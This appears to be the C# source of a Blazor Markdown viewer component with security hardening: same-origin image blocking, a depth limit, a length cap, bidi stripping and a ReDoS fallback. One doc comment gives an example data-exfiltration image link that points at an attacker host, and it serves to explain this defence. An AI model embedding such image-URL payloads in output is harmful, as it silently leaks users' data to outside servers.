using System.Text.RegularExpressions;

namespace Bit.BlazorUI;

/// <summary>
/// BitMarkdownViewer is a native, SEO friendly Blazor component that renders Markdown
/// to HTML entirely in C#. There is no JavaScript interop and no third-party packages.
/// </summary>
/// <remarks>
/// <para>
/// By default the component understands the CommonMark core: headings, emphasis, links and
/// images (including reference links and link reference definitions), lists, block quotes,
/// code, and HTML character references. Richer flavors (GitHub tables, strikethrough, task
/// lists, autolinks, footnotes, alerts, emoji, ...) are opt-in: supply a
/// <see cref="Pipeline"/> built with the desired extensions (for example
/// <see cref="BitMarkdownPipelines.GitHub"/>).
/// </para>
/// <para>
/// Parsing produces an AST which is walked with a <see cref="Microsoft.AspNetCore.Components.Rendering.RenderTreeBuilder"/>,
/// so the output is real DOM rather than an <c>innerHTML</c> blob. Raw HTML in the source
/// is treated as text and link / image URLs are sanitized, keeping the output safe from
/// script injection by default.
/// </para>
/// </remarks>
public partial class BitMarkdownViewer : BitComponentBase
{
    private BitMarkdownDocumentNode _document = new();
    private string? _parsedSource;
    private BitMarkdownPipeline? _parsedWith;
    private BitMarkdownViewerImageRendering _parsedImageRendering;
    private int _parsedMaxDepth;
    private int _parsedMaxLength;
    private bool _parsedStripBidi;
    private bool _parsedInteractiveTasks;
    private bool _notifyParsed;
    private BitMarkdownRenderer? _templateRenderer;
    private BitMarkdownPipeline? _templateRendererPipeline;



    [Inject] private NavigationManager _navigationManager { get; set; } = default!;



    /// <summary>
    /// The Markdown string value to render as html elements.
    /// </summary>
    [Parameter] public string? Markdown { get; set; }

    /// <summary>
    /// The processing pipeline (flavor set). Defaults to <see cref="BitMarkdownPipelines.Basic"/>,
    /// i.e. the basic CommonMark core with no extensions.
    /// </summary>
    [Parameter] public BitMarkdownPipeline? Pipeline { get; set; }

    /// <summary>
    /// Controls whether remote images are allowed to load, guarding against silent
    /// data-exfiltration via auto-fetched image URLs (for example
    /// <c>![x](https://attacker.com/leak?data=SECRET)</c>). Defaults to the safe
    /// <see cref="BitMarkdownViewerImageRendering.SameOrigin"/> policy, which blocks
    /// cross-origin images while still loading same-origin and relative ones; set it
    /// to <see cref="BitMarkdownViewerImageRendering.All"/> to opt back in to loading
    /// every remote image when the Markdown source is fully trusted, or to
    /// <see cref="BitMarkdownViewerImageRendering.None"/> for the strictest policy.
    /// </summary>
    [Parameter] public BitMarkdownViewerImageRendering ImageRendering { get; set; } = BitMarkdownViewerImageRendering.SameOrigin;

    /// <summary>
    /// The maximum block/inline nesting depth allowed while parsing. Content nested
    /// deeper than this is rendered as plain text instead of being parsed further.
    /// This is an always-on safeguard against denial-of-service via pathologically
    /// nested input (e.g. thousands of nested blockquotes or lists) that would
    /// otherwise overflow the stack. Defaults to 100; values &lt;= 0 fall back to the
    /// default. Legitimate documents never approach this limit.
    /// </summary>
    [Parameter] public int MaxNestingDepth { get; set; } = BitMarkdownParseOptions.DefaultMaxDepth;

    /// <summary>
    /// When greater than zero, the Markdown source is truncated to this many characters
    /// before parsing. Use it to bound the work done on untrusted input. Defaults to 0
    /// (no limit).
    /// </summary>
    [Parameter] public int MaxLength { get; set; }

    /// <summary>
    /// When <c>true</c>, Unicode bidirectional control characters are stripped from the
    /// source before parsing, neutralizing "Trojan Source" (CVE-2021-42574) spoofing
    /// where text is made to display in a different order than it is encoded. Recommended
    /// for untrusted or AI-generated Markdown. Defaults to <c>false</c> to preserve
    /// explicit right-to-left embedding in trusted content. Zero-width joiners used by
    /// emoji and complex scripts are never removed.
    /// </summary>
    [Parameter] public bool StripBidiControlCharacters { get; set; }

    /// <summary>
    /// Renders the document as inline content: the root element becomes a <c>span</c> and each
    /// top-level paragraph contributes its inline content directly, without the <c>&lt;p&gt;</c>
    /// that would otherwise force a line of its own. Use it where a short piece of Markdown has to
    /// sit inside a sentence, a table cell or a label. Blocks that are not paragraphs (lists,
    /// tables, headings) still render as themselves. Defaults to <c>false</c>.
    /// </summary>
    [Parameter, ResetClassBuilder] public bool Inline { get; set; }

    /// <summary>
    /// Called after the Markdown source has been parsed, with the document that is about to
    /// be rendered. The tree is the same one the renderer walks, so a handler can read it -
    /// to build a table of contents from the headings, for example - or rewrite it before it
    /// reaches the DOM.
    /// </summary>
    [Parameter] public EventCallback<BitMarkdownDocumentNode> OnParsed { get; set; }

    /// <summary>
    /// Called when a reader ticks or unticks a task-list checkbox, with the source rewritten to
    /// match. Setting it is what makes the checkboxes interactive at all: with no handler they stay
    /// the read-only boxes GitHub renders, so a document nobody is storing cannot be half-edited.
    /// The viewer does not change <see cref="Markdown"/> itself - it hands you the new source and
    /// leaves storing it to you, which is what keeps the component's state the one you own.
    /// Requires the task-list flavor.
    /// </summary>
    [Parameter] public EventCallback<BitMarkdownViewerTaskChangedEventArgs> OnTaskChanged { get; set; }

    /// <summary>
    /// Renders every fenced or indented code block, instead of the <c>&lt;pre&gt;&lt;code&gt;</c>
    /// the viewer would otherwise draw. This is where a syntax highlighter, a copy button or a
    /// diagram renderer goes: the template is given the block, so it can read the language off
    /// <c>Info</c> and the source off <c>Content</c>.
    /// </summary>
    [Parameter] public RenderFragment<BitMarkdownCodeBlockNode>? CodeBlockTemplate { get; set; }

    /// <summary>
    /// Renders every image, instead of the <c>&lt;img&gt;</c> the viewer would otherwise draw -
    /// for a lightbox, a placeholder while it loads, or a component that serves a modern format.
    /// The <see cref="ImageRendering"/> policy has already been applied when the template runs, so
    /// a blocked image reaches it with an empty <c>Url</c>.
    /// </summary>
    [Parameter] public RenderFragment<BitMarkdownImageNode>? ImageTemplate { get; set; }

    /// <summary>
    /// Renders every link, instead of the <c>&lt;a&gt;</c> the viewer would otherwise draw - to
    /// route an in-app destination through the router, or to decorate an external one. The
    /// destination has already been sanitized when the template runs.
    /// </summary>
    /// <remarks>
    /// A link's own content is not rendered for you: write
    /// <c>@context.Children</c> through a renderer of your own, or - far more usually - read
    /// <c>BitMarkdownInlineHelpers.PlainText(context.Children)</c> for its text.
    /// </remarks>
    [Parameter] public RenderFragment<BitMarkdownLinkNode>? LinkTemplate { get; set; }



    /// <summary>
    /// The most recently parsed document. Useful for reading structure out of the source
    /// (headings, links, images) without parsing it a second time.
    /// </summary>
    public BitMarkdownDocumentNode Document => _document;



    protected override string RootElementClass => "bit-mdv";

    protected override void RegisterCssClasses()
    {
        ClassBuilder.Register(() => Inline ? "bit-mdv-inline" : string.Empty);
    }

    private BitMarkdownPipeline EffectivePipeline => Pipeline ?? BitMarkdownPipelines.Basic;

    protected override void OnParametersSet()
    {
        var pipeline = EffectivePipeline;
        var maxDepth = MaxNestingDepth > 0 ? MaxNestingDepth : BitMarkdownParseOptions.DefaultMaxDepth;

        // Re-parse only when an input that affects the output changes.
        if (_parsedSource != Markdown ||
            ReferenceEquals(_parsedWith, pipeline) is false ||
            _parsedImageRendering != ImageRendering ||
            _parsedMaxDepth != maxDepth ||
            _parsedMaxLength != MaxLength ||
            _parsedStripBidi != StripBidiControlCharacters ||
            _parsedInteractiveTasks != OnTaskChanged.HasDelegate)
        {
            _document = ParseSafely(pipeline, maxDepth);
            ApplyImageRendering(_document.Children);
            WireTaskCheckboxes();
            ScopeFootnoteIds();
            _parsedSource = Markdown;
            _parsedWith = pipeline;
            _parsedImageRendering = ImageRendering;
            _parsedMaxDepth = maxDepth;
            _parsedMaxLength = MaxLength;
            _parsedStripBidi = StripBidiControlCharacters;
            _parsedInteractiveTasks = OnTaskChanged.HasDelegate;
            _notifyParsed = true;
        }

        base.OnParametersSet();
    }

    protected override async Task OnParametersSetAsync()
    {
        await base.OnParametersSetAsync();

        // Raised from the async half of the lifecycle so an exception thrown by the handler
        // surfaces through the renderer instead of being lost on an unobserved task.
        if (_notifyParsed)
        {
            _notifyParsed = false;
            if (OnParsed.HasDelegate)
            {
                await OnParsed.InvokeAsync(_document);
            }
        }
    }

    /// <summary>
    /// Gives every task-list checkbox the handler that makes it interactive, when the host is
    /// listening. The handler reads <see cref="OnTaskChanged"/> at the moment it fires rather than
    /// capturing it, so the callback the host most recently supplied is always the one invoked.
    /// </summary>
    private void WireTaskCheckboxes()
    {
        if (OnTaskChanged.HasDelegate is false) return;

        foreach (var checkbox in BitMarkdownAstHelper.Descendants(_document).OfType<BitMarkdownTaskCheckboxNode>())
        {
            var box = checkbox;
            box.OnChange = EventCallback.Factory.Create<ChangeEventArgs>(this, args => HandleTaskChangedAsync(box, args));
        }
    }

    /// <summary>
    /// Stamps this instance's unique id onto every footnote node, so the ids and the links
    /// between them belong to this viewer alone. Two viewers showing footnotes on the same page
    /// would otherwise emit the same ids, and a reference in one would jump into the other.
    /// </summary>
    private void ScopeFootnoteIds()
    {
        if (_document.Children.OfType<BitMarkdownFootnotesNode>().Any() is false) return;

        foreach (var node in BitMarkdownAstHelper.Descendants(_document))
        {
            switch (node)
            {
                case BitMarkdownFootnotesNode footnotes: footnotes.IdScope = UniqueId; break;
                case BitMarkdownFootnoteDefinitionNode definition: definition.IdScope = UniqueId; break;
                case BitMarkdownFootnoteReferenceNode reference: reference.IdScope = UniqueId; break;
            }
        }
    }

    private Task HandleTaskChangedAsync(BitMarkdownTaskCheckboxNode checkbox, ChangeEventArgs args)
    {
        bool isChecked = args.Value is bool value ? value : bool.TryParse(args.Value?.ToString(), out var parsed) && parsed;

        // The tree is updated so the box keeps the state the reader just gave it even if the host
        // stores the new source somewhere the component does not read back.
        checkbox.Checked = isChecked;

        // The box itself carries the line its marker was parsed from, so the marker rewritten is
        // the one the reader clicked - not one a second scan of the source went looking for.
        return OnTaskChanged.InvokeAsync(new BitMarkdownViewerTaskChangedEventArgs(
            checkbox.Index,
            isChecked,
            BitMarkdownTaskList.Toggle(Markdown, checkbox, isChecked)));
    }

    /// <summary>
    /// Applies the input-hardening steps (bidi stripping, length cap) and parses with the
    /// configured depth limit, degrading gracefully to plain text if a parser regex hits
    /// its anti-ReDoS timeout.
    /// </summary>
    private BitMarkdownDocumentNode ParseSafely(BitMarkdownPipeline pipeline, int maxDepth)
    {
        var source = Markdown;

        if (StripBidiControlCharacters && !string.IsNullOrEmpty(source))
            source = BitMarkdownTextSanitizer.StripBidiControlCharacters(source);

        if (MaxLength > 0 && source is not null && source.Length > MaxLength)
        {
            // Never cut between the two halves of a surrogate pair: the lone half would
            // render as a replacement character instead of the emoji (or other astral
            // character) the author wrote.
            int end = MaxLength;
            if (char.IsHighSurrogate(source[end - 1])) end--;
            source = source[..end];
        }

        var options = new BitMarkdownParseOptions { MaxDepth = maxDepth };

        try
        {
            return pipeline.Parse(source, options);
        }
        catch (RegexMatchTimeoutException)
        {
            // A parser regex hit its safety timeout on hostile input. Fall back to a
            // plain-text rendering of the source instead of surfacing the exception.
            var fallback = new BitMarkdownDocumentNode();
            var paragraph = new BitMarkdownParagraphNode();
            paragraph.Inlines.Add(new BitMarkdownTextNode(source ?? string.Empty));
            fallback.Children.Add(paragraph);
            return fallback;
        }
    }

    protected override void BuildRenderTree(RenderTreeBuilder builder)
    {
        var renderer = ResolveRenderer();

        // Inline mode wants a span, but a span may not legally hold a list or a table. A document
        // that is nothing but paragraphs gets one; anything else keeps the div and is laid out
        // inline by the stylesheet instead, so the markup stays valid either way.
        bool asSpan = Inline && HoldsOnlyParagraphs(_document.Children);

        builder.OpenElement(0, asSpan ? "span" : "div");

        builder.AddMultipleAttributes(1, HtmlAttributes);
        builder.AddAttribute(2, "id", _Id);
        builder.AddAttribute(3, "style", StyleBuilder.Value);
        builder.AddAttribute(4, "class", ClassBuilder.Value);
        if (Dir is not null)
        {
            builder.AddAttribute(5, "dir", Dir.Value.ToString().ToLower());
        }
        if (AriaLabel is not null)
        {
            builder.AddAttribute(6, "aria-label", AriaLabel);
        }
        if (TabIndex is not null)
        {
            builder.AddAttribute(7, "tabindex", TabIndex);
        }
        builder.AddElementReferenceCapture(8, v => RootElement = v);

        if (Inline)
        {
            WriteInline(renderer, builder, _document.Children);
        }
        else
        {
            renderer.WriteNodes(builder, _document.Children);
        }

        builder.CloseElement();
    }

    /// <summary>
    /// The renderer this viewer draws with. With no template supplied it is the pipeline's own,
    /// shared instance - which holds nothing but the pipeline's immutable renderer list, so there
    /// is nothing to allocate per render. A viewer that does supply one gets a renderer of its own,
    /// built once, with the template renderer last so it wins over everything the pipeline
    /// registered.
    /// </summary>
    private BitMarkdownRenderer ResolveRenderer()
    {
        var pipeline = EffectivePipeline;

        if (CodeBlockTemplate is null && ImageTemplate is null && LinkTemplate is null)
            return pipeline.Renderer;

        if (_templateRenderer is null || ReferenceEquals(_templateRendererPipeline, pipeline) is false)
        {
            var renderers = new List<BitMarkdownNodeRenderer>(pipeline.Renderers)
            {
                new BitMarkdownViewerTemplateRenderer(this)
            };
            // Given the pipeline's own words, so supplying a template does not silently put a
            // localized document's alerts and back-links back into English.
            _templateRenderer = new BitMarkdownRenderer(renderers, pipeline.Texts);
            _templateRendererPipeline = pipeline;
        }

        return _templateRenderer;
    }

    private static bool HoldsOnlyParagraphs(IList<BitMarkdownNode> nodes)
    {
        foreach (var node in nodes)
        {
            if (node is not BitMarkdownParagraphNode) return false;
        }
        return true;
    }

    /// <summary>
    /// Writes the document without the block wrapper each top-level paragraph would otherwise get,
    /// so a one-line piece of Markdown can sit inside a sentence, a table cell or a button label.
    /// Every other block (a list, a table, a heading) still renders as itself.
    /// </summary>
    private static void WriteInline(BitMarkdownRenderer renderer, RenderTreeBuilder builder, IList<BitMarkdownNode> nodes)
    {
        for (int i = 0; i < nodes.Count; i++)
        {
            if (nodes[i] is BitMarkdownParagraphNode paragraph)
            {
                // Paragraphs are separated by a space rather than run together, so two of them do
                // not read as one word.
                if (i > 0) builder.AddContent(9, " ");
                renderer.WriteNodes(builder, paragraph.Inlines);
                continue;
            }

            renderer.WriteNode(builder, nodes[i]);
        }
    }

    /// <summary>
    /// Walks the parsed AST and strips the source from any image that the active
    /// <see cref="ImageRendering"/> policy disallows, so the browser never issues the
    /// underlying request. The alt text is preserved for accessibility.
    /// </summary>
    private void ApplyImageRendering(IList<BitMarkdownNode> nodes)
    {
        if (ImageRendering == BitMarkdownViewerImageRendering.All)
            return;

        for (int i = 0; i < nodes.Count; i++)
        {
            var node = nodes[i];

            if (node is BitMarkdownImageNode img && ShouldBlockImage(img.Url))
            {
                // Url is init-only, so replace the node with a source-less copy.
                nodes[i] = new BitMarkdownImageNode
                {
                    Url = string.Empty,
                    Title = img.Title,
                    Alt = img.Alt
                };
                continue;
            }

            foreach (var childList in node.ChildLists)
            {
                ApplyImageRendering(childList);
            }
        }
    }

    private bool ShouldBlockImage(string url) => ImageRendering switch
    {
        BitMarkdownViewerImageRendering.None => true,
        BitMarkdownViewerImageRendering.SameOrigin => IsCrossOrigin(url),
        _ => false
    };

    // Cross-origin = a URL the browser would resolve to a different origin (scheme + host
    // + port) than the current page and fetch cross-site. Relative paths, anchors and
    // same-document references stay same-origin, and so do absolute URLs that point back
    // at the current origin; only those are kept under the SameOrigin policy. Absolute
    // http(s) URLs and protocol-relative ("//host/...") URLs are resolved against the
    // page's base URI before their origins are compared, so same-origin absolute URLs are
    // no longer blocked while genuinely cross-origin ones still are.
    private bool IsCrossOrigin(string url)
    {
        if (string.IsNullOrEmpty(url))
            return false;

        var isAbsolute = url.StartsWith("http://", StringComparison.OrdinalIgnoreCase) ||
                         url.StartsWith("https://", StringComparison.OrdinalIgnoreCase);
        var isProtocolRelative = url.StartsWith("//", StringComparison.Ordinal);

        // Relative paths, fragments and same-document references never leave the origin.
        if (isAbsolute is false && isProtocolRelative is false)
            return false;

        // Resolve the image URL against the page's base URI and compare origins.
        if (Uri.TryCreate(_navigationManager.BaseUri, UriKind.Absolute, out var baseUri) &&
            Uri.TryCreate(baseUri, url, out var imageUri))
        {
            return string.Equals(baseUri.Scheme, imageUri.Scheme, StringComparison.OrdinalIgnoreCase) is false ||
                   string.Equals(baseUri.Host, imageUri.Host, StringComparison.OrdinalIgnoreCase) is false ||
                   baseUri.Port != imageUri.Port;
        }

        // If the origin can't be determined, err on the side of caution and block.
        return true;
    }
}
